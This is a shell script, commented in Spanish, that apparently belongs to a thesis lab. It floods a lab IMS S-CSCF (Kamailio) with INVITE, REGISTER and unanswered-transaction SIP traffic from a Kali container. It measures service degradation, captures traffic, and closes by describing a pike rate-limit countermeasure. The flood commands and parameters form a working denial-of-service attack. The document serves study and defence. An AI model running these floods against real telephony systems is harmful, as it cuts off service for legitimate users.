#!/bin/sh
# ============================================================================
# v2_dos.sh — V2 Denegación de Servicio sobre IMS (CVSS 8.6, MITRE T1498).
# Modos: invite (INVITE flood, probado) / register (REGISTER flood: camino
#   costoso Diameter SAR; SIPp + XML, fallback Python stdlib) /
#   txn (transaction exhaustion: INVITE sin ACK/BYE, timer B 32s).
# Métrica de éxito: servicio legítimo degradado (503/timeout o RTT >5000ms),
#   medida con muestreador sipsak -> results/v2_<modo>_<TS>.csv (§5.2 tesis).
# Uso: ./v2_dos.sh  (pregunta parámetros; entre [] el valor probado)
# Requiere: lab UP y contenedor kali. Recuperable: reiniciar CSCF si se cuelga.
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v2] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}

docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
  || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
mkdir -p results; touch results/hashes.txt 2>/dev/null || true

TARGET=$(ask TARGET "IP objetivo (S-CSCF)" "172.20.0.6")
PORT=$(ask PORT "Puerto SIP" "6060")
USER=$(ask USER "Usuario To del flood" "1001")
DOMAIN=$(ask DOMAIN "Dominio IMS" "ims.mnc070.mcc999.3gppnetwork.org")
MODE=$(ask MODE "Modo: invite / register / txn" "invite")
COUNT=$(ask COUNT "N° paquetes" "3000")
RATE=$(ask RATE "Tasa objetivo SIPp/Python (pkt/s; inviteflood va a máx. velocidad)" "200")
PROBE_CONT=$(ask PROBE_CONT "Contenedor sonda legítima (kali=atacante / pyhss_hss=neutral)" "kali")
TS=$(date -u +%Y%m%dT%H%M%SZ)
if [ "$PROBE_CONT" = "kali" ]; then
  CSV="/root/results/v2_${MODE}_${COUNT}_$TS.csv"
else
  CSV="/tmp/v2_${MODE}_${COUNT}_$TS.csv"
fi
CSVNAME="v2_${MODE}_${COUNT}_$TS.csv"

stop_sampler() {
  docker exec "$PROBE_CONT" touch /tmp/v2sample.stop >/dev/null 2>&1 || true
}
# kali no trae pkill/ps: se mata por /proc/cmdline.
kallikill() {
  docker exec -e KILLPAT="$1" kali sh -c 'for p in /proc/[0-9]*/cmdline; do if grep -qa "$KILLPAT" "$p" 2>/dev/null; then pid=${p#/proc/}; kill "${pid%/cmdline}" 2>/dev/null; fi; done' >/dev/null 2>&1 || true
}
cleanup() {
  stop_sampler
  kallikill tshark
  kallikill sipp
  kallikill inviteflood
  kallikill reg_flood
  kallikill txn_exhaust
}
trap cleanup INT TERM EXIT

# --- Fase 2: config actual (¿pike activo?) ---
log "F2 config: ¿pike (rate-limit) activo en S-CSCF? (esperado: NO en lab vulnerable)"
if docker exec kamailio ls /usr/local/lib64/kamailio/modules/pike.so >/dev/null 2>&1; then
  log "módulo pike.so disponible en la imagen (falta cargarlo en scscf.cfg)"
else
  log "AVISO: pike.so no está en la imagen; la contramedida requeriría recompilar"
fi
grep -a -iE "modparam.*pike|pike_check|reqs_density" kamailio/scscf/scscf.cfg || log "(sin pike en scscf.cfg = vulnerable)"

# Sonda legítima: REGISTER vía Python (sipsak no sirve: el S-CSCF no
# responde OPTIONS y sipsak sale mudo; además exige rport). Imprime
# "rtt_ms=<n> status=<200|401|503|TIMEOUT>".
docker cp attacks/v2_dos_ims/sip_probe.py "$PROBE_CONT":/tmp/sip_probe.py
rtt() {
  docker exec -e PROBE_TARGET="$TARGET" -e PROBE_PORT="$PORT" -e PROBE_USER=1000 -e PROBE_DOMAIN="$DOMAIN" \
    "$PROBE_CONT" python3 /tmp/sip_probe.py 2>/dev/null
}

log "RTT baseline:"
BASE=$(rtt); log "baseline: $BASE"
PCAP="/root/results/v2_${MODE}_${COUNT}_$TS.pcapng"
docker exec -d kali sh -c "timeout 300 tshark -i eth0 -w $PCAP -f 'udp port $PORT' >/dev/null 2>&1"
# Muestreador de latencia durante el flood -> CSV (§5.2 tesis).
# Se detiene con /tmp/v2sample.stop (stop_sampler), no con pkill.
docker exec -d -e CSV="$CSV" -e TARGET="$TARGET" -e PORT="$PORT" -e DOMAIN="$DOMAIN" "$PROBE_CONT" sh -c \
  'rm -f /tmp/v2sample.stop; echo "ts,rtt_ms,status" > "$CSV"; while [ ! -f /tmp/v2sample.stop ]; do S=$(date +%s); OUT=$(PROBE_TARGET=$TARGET PROBE_PORT=$PORT PROBE_USER=1000 PROBE_DOMAIN=$DOMAIN PROBE_TIMEOUT=6 python3 /tmp/sip_probe.py 2>/dev/null); MS=$(echo "$OUT" | grep -a -oE "rtt_ms=[0-9]+" | cut -d= -f2); CODE=$(echo "$OUT" | grep -a -oE "status=[A-Z0-9]+" | cut -d= -f2); [ -n "$MS" ] || MS=6000; [ -n "$CODE" ] || CODE="TIMEOUT"; echo "$S,$MS,$CODE" >> "$CSV"; sleep 2; done' >/dev/null 2>&1
log "Muestreador latencia -> $CSV (cada 2s: timestamp, RTT, status)."
sleep 2

case "$MODE" in
  invite)
    log "Flood $COUNT INVITE a $TARGET:$PORT (origen puerto 9/discard; decodificar con -d udp.port==9,sip)..."
    docker exec kali sh -c "timeout 120 inviteflood eth0 $USER $DOMAIN $TARGET $COUNT -D $PORT >/tmp/flood.log 2>&1; tr '\r' '\n' < /tmp/flood.log | tail -n 2"
    ;;
  register)
    log "REGISTER flood $COUNT (cada REGISTER dispara SAR a Diameter = camino costoso)..."
    docker cp attacks/v2_dos_ims/register_flood.xml kali:/root/register_flood.xml
    docker cp attacks/v2_dos_ims/reg_flood.py kali:/root/reg_flood.py
    # sipp -bg daemoniza y el padre sale con rc=99: no usar su rc; se espera a que termine (-m).
    docker exec kali sh -c "TERM=xterm timeout 170 sipp $TARGET:$PORT -sf /root/register_flood.xml -m $COUNT -r $RATE -l 1000 -t u1 -bg >/tmp/sipp.log 2>&1" || true
    sleep 5
    if docker exec kali sh -c "pidof sipp >/dev/null" 2>/dev/null; then
      log "SIPp corriendo (REGISTER $COUNT a $TARGET:$PORT); esperando fin..."
      i=0; while [ "$i" -lt 150 ]; do docker exec kali sh -c "pidof sipp >/dev/null" 2>/dev/null || break; sleep 5; i=$((i + 5)); done
      kallikill sipp
      docker exec kali sh -c "tail -n 3 /tmp/sipp.log" || true
    else
      log "SIPp no arrancó; fallback Python stdlib..."
      docker exec -e REG_TARGET="$TARGET" -e REG_PORT="$PORT" -e REG_COUNT="$COUNT" -e REG_RATE="$RATE" -e REG_DOMAIN="$DOMAIN" \
        kali python3 /root/reg_flood.py
    fi
    ;;
  txn)
    log "Transaction exhaustion: INVITE sin ACK/BYE (transacciones en TRYING hasta timer B/fr_timer)..."
    RURI=$(ask RURI "Request-URI host: dominio=final 478 rápida / 172.20.0.99=blackhole sin final" "$DOMAIN")
    docker cp attacks/v2_dos_ims/txn_exhaust.py kali:/root/txn_exhaust.py
    docker exec -e TXN_TARGET="$TARGET" -e TXN_PORT="$PORT" -e TXN_COUNT="$COUNT" -e TXN_RATE="$RATE" -e TXN_USER="$USER" -e TXN_DOMAIN="$DOMAIN" -e TXN_RURI_HOST="$RURI" \
      kali python3 /root/txn_exhaust.py
    ;;
  *) log "ERROR: modo $MODE inválido (invite/register/txn)"; exit 1 ;;
esac

log "Deteniendo floods (el muestreador sigue 32s para curva de recuperación/MTTR)..."
kallikill sipp
kallikill inviteflood
kallikill reg_flood
kallikill txn_exhaust
sleep 32
log "(ventana 32s: expira timer B; el CSV incluye flood + recuperación.)"
stop_sampler
trap - INT TERM EXIT
cleanup
sleep 1

log "--- Resumen CSV latencia (ts,rtt_ms,status) ---"
if [ "$PROBE_CONT" != "kali" ]; then
  docker cp "$PROBE_CONT:$CSV" "results/$CSVNAME" >/dev/null
fi
tail -n 5 "results/$CSVNAME"
SUM=$(awk -F, 'NR>1{n++;s+=$2;if($2>m)m=$2;if($3=="TIMEOUT")t++;if($3=="503")f++}END{printf "n=%d avg=%dms max=%dms timeouts=%d 503s=%d",n,(n?s/n:0),m+0,t+0,f+0}' "results/$CSVNAME")
log "MTTR/flood: $SUM"
log "RTT post:"
DURING=$(rtt); log "post-flood: $DURING (éxito si 503/timeout o >5000ms)"
H=$(docker exec kali sh -c "sha256sum $PCAP | cut -d' ' -f1")
HC=$(sha256sum "results/$CSVNAME" | cut -d' ' -f1)
FN=$(basename "$PCAP"); FC="$CSVNAME"
echo "$H  $FN  V2-$MODE  $(date -u +%Y-%m-%dT%H:%M:%SZ)  $MODE $COUNT a $TARGET:$PORT (base $BASE, post $DURING; $SUM)" >> results/hashes.txt
echo "$HC  $FC  V2-$MODE-csv  $(date -u +%Y-%m-%dT%H:%M:%SZ)  latencia REGISTER-probe desde $PROBE_CONT durante flood ($SUM)" >> results/hashes.txt
log "hashes registrados (pcap + csv). Analizar: tshark -r $PCAP -d udp.port==9,sip -Y sip.Status-Code"
log "Veredicto: con pike activo el atacante recibe 403 y la sonda neutral mantiene RTT normal."
log "F4 contramedida (scscf.cfg): loadmodule pike.so + modparam sampling_time_unit 2 + reqs_density_per_unit 30 + pike_check_req() al inicio de request_route; reiniciar S-CSCF y re-ejecutar (se espera bloqueo del atacante y RTT legítimo normal)."
